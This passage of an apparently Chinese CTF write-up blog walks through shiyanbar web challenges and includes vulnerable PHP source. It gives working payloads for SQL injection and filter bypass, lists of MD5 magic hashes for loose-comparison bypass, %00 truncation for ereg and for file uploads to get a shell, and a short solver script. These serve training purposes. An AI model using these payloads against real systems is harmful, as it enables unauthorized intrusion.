class="line">echo &#39;&lt;&#x2F;form&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue&#x3D;implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;&#x2F;&quot;.$ArrReq.&quot;&#x2F;is&quot;,$StrValue)&#x3D;&#x3D;1)&#123;   </span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key&#x3D;&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con &#x3D; mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">die(&#39;Could not connect: &#39; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db&#x3D;&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM interest WHERE uname &#x3D; &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">    if($key[&#39;pwd&#39;] &#x3D;&#x3D; $_POST[&#39;pwd&#39;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。<br>我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。  </p><blockquote><p>mysql&gt; create table test (<br>    -&gt; user varchar(100) not null,<br>    -&gt; pwd varchar(100) not null);<br>mysql&gt;insert into test values(“admin”,”mypass”);<br>mysql&gt;select <em> from test group by pwd with rollup<br>mysql&gt; select </em> from test group by pwd with rollup;<br>+——-+————+<br>| user  | pwd        |<br>+——-+————+<br>| guest | alsomypass |<br>| admin | mypass     |<br>| admin | NULL       |<br>+——-+————+<br>3 rows in set<br>mysql&gt; select <em> from test group by pwd with rollup limit 1<br>;<br>+——-+————+<br>| user  | pwd        |<br>+——-+————+<br>| guest | alsomypass |<br>+——-+————+<br>mysql&gt; select </em> from test group by pwd with rollup limit 1 offset 0<br>;<br>+——-+————+<br>| user  | pwd        |<br>+——-+————+<br>| guest | alsomypass |<br>+——-+————+<br>1 row in set<br>mysql&gt; select <em> from test group by pwd with rollup limit 1 offset 1<br>;<br>+——-+——–+<br>| user  | pwd    |<br>+——-+——–+<br>| admin | mypass |<br>+——-+——–+<br>1 row in set<br>mysql&gt; select </em> from test group by pwd with rollup limit 1 offset 2<br>;<br>+——-+——+<br>| user  | pwd  |<br>+——-+——+<br>| admin | NULL |<br>+——-+——+<br>1 row in set   </p></blockquote><p>构造payload:<br><code>uname=1&#39; or true group by pwd with rollup limit 1 offset 2#&amp;pwd=</code><br>offset 2为偏移两个数据，即第三行的pwd字段为空。<br><img src="https://i.loli.net/2019/04/09/5cac9b6950ed3.png" alt="">  </p><h3 id="0x09-简单的sql注入之3"><a href="#0x09-简单的sql注入之3" class="headerlink" title="0x09 简单的sql注入之3"></a>0x09 简单的sql注入之3</h3><h4 id="简单概括：-8"><a href="#简单概括：-8" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：mysql报错注入</li><li>难度：易  </li><li>WP：<a href="https://www.cnblogs.com/caizhiren/p/7846917.html">https://www.cnblogs.com/caizhiren/p/7846917.html</a>  </li></ul><h4 id="解题过程：-8"><a href="#解题过程：-8" class="headerlink" title="解题过程："></a>解题过程：</h4><p>exp函数报错一把嗦  </p><h3 id="0x0A-简单的sql注入之2"><a href="#0x0A-简单的sql注入之2" class="headerlink" title="0x0A 简单的sql注入之2"></a>0x0A 简单的sql注入之2</h3><h4 id="简单概括：-9"><a href="#简单概括：-9" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：空格过滤  </li><li>难度：易  </li><li>WP：<a href="https://www.cnblogs.com/caizhiren/p/7862466.html">https://www.cnblogs.com/caizhiren/p/7862466.html</a>  </li></ul><h4 id="解题过程：-9"><a href="#解题过程：-9" class="headerlink" title="解题过程："></a>解题过程：</h4><p>简单Fuzz发现过滤了空格，使用内敛注释一把嗦。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x3D;database()</span><br></pre></td></tr></table></figure></p><h3 id="0x0B-简单的sql注入之1"><a href="#0x0B-简单的sql注入之1" class="headerlink" title="0x0B 简单的sql注入之1"></a>0x0B 简单的sql注入之1</h3><h4 id="简单概括：-10"><a href="#简单概括：-10" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：双层叠加绕过  </li><li>难度：易</li><li>WP：<a href="https://www.jianshu.com/p/5d37d33854e3">https://www.jianshu.com/p/5d37d33854e3</a>  </li></ul><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selectselect </span><br></pre></td></tr></table></figure><h3 id="0x0C-天下武功唯快不破"><a href="#0x0C-天下武功唯快不破" class="headerlink" title="0x0C 天下武功唯快不破"></a>0x0C 天下武功唯快不破</h3><h4 id="简单概括：-11"><a href="#简单概括：-11" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：脚本工具的编写  </li><li>难度：易  </li><li>WP：无</li></ul><h4 id="解题过程：-10"><a href="#解题过程：-10" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests,base64</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;10&#x2F;10.php&#39;)</span><br><span class="line">key&#x3D;base64.b64decode(r.headers[&#39;FLAG&#39;])[-9:]</span><br><span class="line">r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;10&#x2F;10.php&#39;,data&#x3D;&#123;&#39;key&#39;:key&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="0x0D-让我进去"><a href="#0x0D-让我进去" class="headerlink" title="0x0D 让我进去"></a>0x0D 让我进去</h3><h4 id="简单概括：-12"><a href="#简单概括：-12" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：hash长度拓展攻击  </li><li>难度：难  </li><li>WP：<a href="http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/">http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/</a>  </li></ul><h3 id="0x0E-拐弯抹角"><a href="#0x0E-拐弯抹角" class="headerlink" title="0x0E 拐弯抹角"></a>0x0E 拐弯抹角</h3><h4 id="简单概括：-13"><a href="#简单概括：-13" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：<code>index.php/index.php</code>  </li><li>难度：易  </li><li>WP：无</li></ul><h4 id="解题过程：-11"><a href="#解题过程：-11" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php&#x2F;index.php</span><br></pre></td></tr></table></figure><h3 id="0X0F-Forms"><a href="#0X0F-Forms" class="headerlink" title="0X0F Forms"></a>0X0F Forms</h3><h4 id="简单概括：-14"><a href="#简单概括：-14" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：不清楚，过于简单  </li><li>难度：无  </li><li>WP：无  </li></ul><h3 id="0x10-天网管理系统"><a href="#0x10-天网管理系统" class="headerlink" title="0x10 天网管理系统"></a>0x10 天网管理系统</h3><h4 id="简单概括：-15"><a href="#简单概括：-15" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：PHP<code>==</code>弱类型比较，PHP序列化与反序列化  </li><li>难度：易  </li><li>WP：<a href="http://www.cnblogs.com/ssooking/p/5877086.html">http://www.cnblogs.com/ssooking/p/5877086.html</a>  </li></ul><h4 id="解题过程：-12"><a href="#解题过程：-12" class="headerlink" title="解题过程："></a>解题过程：</h4><p>右键查看源代码发现部分源码 ：<br><img src="https://i.loli.net/2019/04/09/5caca4c359172.png" alt=""><br>我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure></p><h3 id="0x11-忘记密码了"><a href="#0x11-忘记密码了" class="headerlink" title="0x11 忘记密码了"></a>0x11 忘记密码了</h3><h4 id="简单概括：-16"><a href="#简单概括：-16" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：vim源码泄露  </li><li>难度：中  </li><li>WP：<code>.submit.php.swp</code></li></ul><h4 id="解题过程：-13"><a href="#解题过程：-13" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，观察源码，发现管理员邮箱：<a href="mailto:admin@simplexue.com">admin@simplexue.com</a>，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。<br><img src="https://i.loli.net/2019/04/09/5cacae6dda29d.png" alt="">  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">如果登录邮箱地址不是管理员则 die()</span><br><span class="line">数据库结构</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- 表的结构 &#96;user&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">CREATE TABLE IF NOT EXISTS &#96;user&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;username&#96; varchar(255) NOT NULL,</span><br><span class="line">  &#96;email&#96; varchar(255) NOT NULL,</span><br><span class="line">  &#96;token&#96; int(255) NOT NULL DEFAULT &#39;0&#39;,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8 AUTO_INCREMENT&#x3D;2 ;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- 转存表中的数据 &#96;user&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;user&#96; (&#96;id&#96;, &#96;username&#96;, &#96;email&#96;, &#96;token&#96;) VALUES</span><br><span class="line">(1, &#39;****不可见***&#39;, &#39;***不可见***&#39;, 0);</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line">if(!empty($token)&amp;&amp;!empty($emailAddress))&#123;</span><br><span class="line">if(strlen($token)!&#x3D;10) die(&#39;fail&#39;);</span><br><span class="line">if($token!&#x3D;&#39;0&#39;) die(&#39;fail&#39;);</span><br><span class="line">$sql &#x3D; &quot;SELECT count(*) as num from &#96;user&#96; where token&#x3D;&#39;$token&#39; AND email&#x3D;&#39;$emailAddress&#39;&quot;;</span><br><span class="line">$r &#x3D; mysql_query($sql) or die(&#39;db error&#39;);</span><br><span class="line">$r &#x3D; mysql_fetch_assoc($r);</span><br><span class="line">$r &#x3D; $r[&#39;num&#39;];</span><br><span class="line">if($r&gt;0)&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;失败了呀&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload: <a href="mailto:`token=0e11111111&amp;emailAddress=admin@simplexue.com">`token=0e11111111&amp;emailAddress=admin@simplexue.com</a>`<br><img src="https://i.loli.net/2019/04/09/5cacae6dedacc.png" alt="">  </p><h3 id="0x12-Once-More"><a href="#0x12-Once-More" class="headerlink" title="0x12 Once More"></a>0x12 Once More</h3><h4 id="简单概括：-17"><a href="#简单概括：-17" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：ereg函数%00截断，科学计数法  </li><li>难度：易  </li><li>WP：<code>1e9%00*-*</code></li></ul><h4 id="解题过程：-14"><a href="#解题过程：-14" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，得到题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;p&gt;You password must be alphanumeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">&#123;</span><br><span class="line">die(&#39;Flag: &#39; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&#39;&lt;p&gt;*-* have not been found&lt;&#x2F;p&gt;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;p&gt;Invalid password&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含<code>*-*</code>。<br>我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：<br><code>?password=1e8%00*-*</code><br>注意此处的%00只占一个字符的大小。<br><img src="https://i.loli.net/2019/04/11/5caf5ee4d7fef.png" alt="">  </p><h3 id="0x13-Guess-Next-Session"><a href="#0x13-Guess-Next-Session" class="headerlink" title="0x13 Guess Next Session"></a>0x13 Guess Next Session</h3><h4 id="简单概括：-18"><a href="#简单概括：-18" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：Session与Cookie绑定，PHP弱类型比较  </li><li>难度：易  </li><li>WP：<code>删掉Cookie，?password=</code>  </li></ul><h4 id="解题过程：-15"><a href="#解题过程：-15" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;password&#39;] &#x3D;&#x3D; $_SESSION[&#39;password&#39;])</span><br><span class="line">        die (&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#39;&lt;p&gt;Wrong guess.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION[‘password’]的值将为NULL，此时如果我们get传入的 password为空，即’’，那么比较结果即为true。<br>payload:<br><code>将cookie删除或禁用，接着访问?password=</code><br><img src="https://i.loli.net/2019/04/11/5caf5ee4d9f11.png" alt="">  </p><h3 id="0x14-FALSE"><a href="#0x14-FALSE" class="headerlink" title="0x14 FALSE"></a>0x14 FALSE</h3><h4 id="简单概括：-19"><a href="#简单概括：-19" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：sha1,md5等传入数组返回Null，PHP弱类型比较  </li><li>难度：易  </li><li>WP：<code>?name[]=1&amp;password[]=2</code>  </li></ul><h4 id="解题过程：-16"><a href="#解题过程：-16" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目获得源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">        echo &#39;&lt;p&gt;Your password can not be your name!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">      die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#39;&lt;p&gt;Invalid password.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;&lt;p&gt;Login first!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过<code>sha1($name)===sha1($password)</code>的强类型判断。<br>故我们的payload构造如下：<br><code>?name[]=a&amp;password[]=b</code><br><img src="https://i.loli.net/2019/04/11/5caf5ee4db525.png" alt="">  </p><h3 id="0x15-上传绕过"><a href="#0x15-上传绕过" class="headerlink" title="0x15 上传绕过"></a>0x15 上传绕过</h3><h4 id="简单概括：-20"><a href="#简单概括：-20" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：目录名%00截断  </li><li>难度：易  </li><li>WP：<code>/upload/1.php%00</code>  </li></ul><h4 id="解题过程：-17"><a href="#解题过程：-17" class="headerlink" title="解题过程："></a>解题过程：</h4><p>burp抓个上传包：<br><img src="https://i.loli.net/2019/04/11/5caf6134b532a.png" alt=""><br>首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。<br>如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。<br><img src="https://i.loli.net/2019/04/11/5caf6134b0844.png" alt="">  </p><h3 id="0x16-NSCTF-web200"><a href="#0x16-NSCTF-web200" class="headerlink" title="0x16 NSCTF web200"></a>0x16 NSCTF web200</h3><h4 id="简单概括：-21"><a href="#简单概括：-21" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：逆加密过程  </li><li>难度：易  </li><li>WP：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">部分：</span><br><span class="line">x &#x3D; &quot;~88:36e1bg8438e41757d:29cgeb6e48c&#96;GUDTO|;hbmg&quot;</span><br><span class="line">c &#x3D; &quot;&quot;</span><br><span class="line">for a in x:</span><br><span class="line">    b &#x3D; ord(a)</span><br><span class="line">    c +&#x3D; chr(b-1)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></li></ul><h4 id="解题过程：-18"><a href="#解题过程：-18" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目：<br><img src="http://ctf5.shiyanbar.com/web/web200.jpg" alt=""><br>解密问题，按照加密过程反着解密即可。  </p><h3 id="0x17-程序逻辑问题"><a href="#0x17-程序逻辑问题" class="headerlink" title="0x17 程序逻辑问题"></a>0x17 程序逻辑问题</h3><h4 id="简单概括：-22"><a href="#简单概括：-22" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：union select联合注入  </li><li>难度：易  </li><li>WP：<code>user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&amp;pass=1</code>  </li></ul><h4 id="解题过程：-19"><a href="#解题过程：-19" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，右键查看源代码得到题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">welcome to simplexue</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">$conn &#x3D; mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user &#x3D; $_POST[user];</span><br><span 